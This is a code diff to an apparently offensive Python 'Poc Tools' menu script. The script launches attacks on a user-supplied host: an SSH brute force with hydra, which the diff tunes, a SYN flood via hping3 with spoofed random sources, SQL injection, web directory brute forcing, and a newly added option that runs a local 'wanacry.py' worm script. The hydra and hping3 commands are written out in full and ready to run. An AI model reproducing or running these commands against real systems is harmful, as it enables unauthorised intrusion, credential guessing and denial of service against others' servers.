@@ -29,7 +29,7 @@ def brute_force():
     if(sshIp == ''):
 		print '[-] Skip ssh_Brute Attack.'
     else:
-		os.system('hydra -L ./user.list -P ./passwd.list -e ns -V %s ssh'%(sshIp))
+		os.system('hydra -L ./user.list -P ./passwd.list -e ns -t 1 -V %s ssh'%(sshIp))
 
 
 def web_dir_brute():
@@ -71,6 +71,9 @@ def Dos_attack():
 	else:
 		os.system('hping3 -c 1000  -S -w 64 -p 80 --flood --rand-source %s'%(host))
 
+def Wanacry_worm():
+	os.system('./scene/wanacry.py')
+
 def main():
   os.system('figlet Poc Tools -f /usr/share/figlet/big.flf')
   while(1):
@@ -81,9 +84,10 @@ def main():
     print "[*] 3. SqlInject attack.\r"
     print "[*] 4. Web dir brute attack.\r"
     print "[*] 5. DOS attack.\r"
+    print "[*] 6. Wanacry worm attack.\r"
     print "[*] 0. Exit script.\r\n"
     attack_type = raw_input("Confirm the type of attack you chose first: ")
-    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'5': Dos_attack,'0': Exit}
+    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'5': Dos_attack,'6': Wanacry_worm,'0': Exit}
     start_attack = attacks[attack_type]
     start_attack()
     
